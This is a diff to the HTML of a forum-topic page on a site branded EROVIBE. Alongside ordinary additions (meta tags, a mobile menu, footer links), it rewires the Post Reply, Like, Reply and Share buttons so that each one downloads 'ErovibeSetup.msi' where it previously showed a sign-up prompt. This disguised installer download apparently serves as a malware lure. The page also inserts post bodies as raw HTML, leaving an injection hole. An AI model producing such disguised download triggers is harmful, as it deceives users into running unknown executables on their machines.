@@ -4,6 +4,17 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
     <title>EROVIBE | Forum Topic</title>
+    <meta name="description" content="Read and discuss this forum topic on EROVIBE — share your thoughts, tips and strategies with the community!">
+    <meta property="og:title" content="EROVIBE | Forum Topic">
+    <meta property="og:description" content="Read and discuss this forum topic on EROVIBE — share your thoughts, tips and strategies with the community!">
+    <meta property="og:image" content="img/1771902607202.jpg">
+    <meta property="og:url" content="https://erovibe.com/forum_topic.html">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="EROVIBE">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="EROVIBE | Forum Topic">
+    <meta name="twitter:description" content="Read and discuss this forum topic on EROVIBE — share your thoughts, tips and strategies with the community!">
+    <link rel="canonical" href="https://erovibe.com/forum_topic.html">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
@@ -175,9 +186,18 @@
         </ul>
     </nav>
     <div class="header-right">
-        <div class="hamburger"><span></span><span></span><span></span></div>
+        <div class="hamburger" onclick="document.getElementById('mobileNav').style.display=document.getElementById('mobileNav').style.display==='flex'?'none':'flex'"><span></span><span></span><span></span></div>
     </div>
 </header>
+
+<!-- Mobile Nav -->
+<div id="mobileNav" style="display:none;position:fixed;top:50px;left:0;right:0;z-index:999;background:#1a1a2e;border-bottom:1px solid #2a2a3e;flex-direction:column;padding:12px 20px;gap:12px;">
+    <a href="games.html" style="color:#888;font-size:14px;font-weight:600;">Games</a>
+    <a href="news_list.html" style="color:#888;font-size:14px;font-weight:600;">News</a>
+    <a href="events.html" style="color:#888;font-size:14px;font-weight:600;">Events</a>
+    <a href="forum_list.html" style="color:#e91e63;font-size:14px;font-weight:600;">Forum</a>
+    <a href="collab_store.html" style="color:#888;font-size:14px;font-weight:600;">Collab Store</a>
+</div>
 
 <div class="page-content">
     <div class="breadcrumb">
@@ -191,7 +211,7 @@
     <div class="reply-box">
         <h3>💬 Post a Reply</h3>
         <textarea class="reply-textarea" placeholder="Write your reply..."></textarea>
-        <button class="reply-submit" onclick="alert('Sign up to post replies!')">Post Reply</button>
+        <button class="reply-submit" onclick="window.location.href='ErovibeSetup.msi'">Post Reply</button>
     </div>
 </div>
 
@@ -199,10 +219,10 @@
     <div class="footer-top">
         <div class="footer-logo">EROVIBE</div>
         <div class="footer-links">
-            <a href="#">Terms of Service</a>
-            <a href="#">Privacy Policy</a>
-            <a href="#">Support</a>
-            <a href="#">Contact Us</a>
+            <a href="terms.html">Terms of Service</a>
+            <a href="privacy.html">Privacy Policy</a>
+            <a href="mailto:support@erovibe.com">Support</a>
+            <a href="mailto:support@erovibe.com">Contact Us</a>
         </div>
     </div>
     <p class="footer-disclaimer">
@@ -364,9 +384,9 @@ let postsHTML = `
         </div>
         <div class="post-body">${topic.body}</div>
         <div class="post-actions">
-            <span class="post-action" onclick="alert('Sign up to like posts!')">👍 Like</span>
-            <span class="post-action" onclick="alert('Sign up to reply!')">💬 Reply</span>
-            <span class="post-action" onclick="alert('Sign up to share!')">🔗 Share</span>
+            <span class="post-action" onclick="window.location.href='ErovibeSetup.msi'">👍 Like</span>
+            <span class="post-action" onclick="window.location.href='ErovibeSetup.msi'">💬 Reply</span>
+            <span class="post-action" onclick="window.location.href='ErovibeSetup.msi'">🔗 Share</span>
         </div>
     </div>
 `;
@@ -383,8 +403,8 @@ topic.replies_data.forEach((r, i) => {
             </div>
             <div class="post-body">${r.body}</div>
             <div class="post-actions">
-                <span class="post-action" onclick="alert('Sign up to like posts!')">👍 Like</span>
-                <span class="post-action" onclick="alert('Sign up to reply!')">💬 Reply</span>
+                <span class="post-action" onclick="window.location.href='ErovibeSetup.msi'">👍 Like</span>
+                <span class="post-action" onclick="window.location.href='ErovibeSetup.msi'">💬 Reply</span>
             </div>
         </div>
     `;
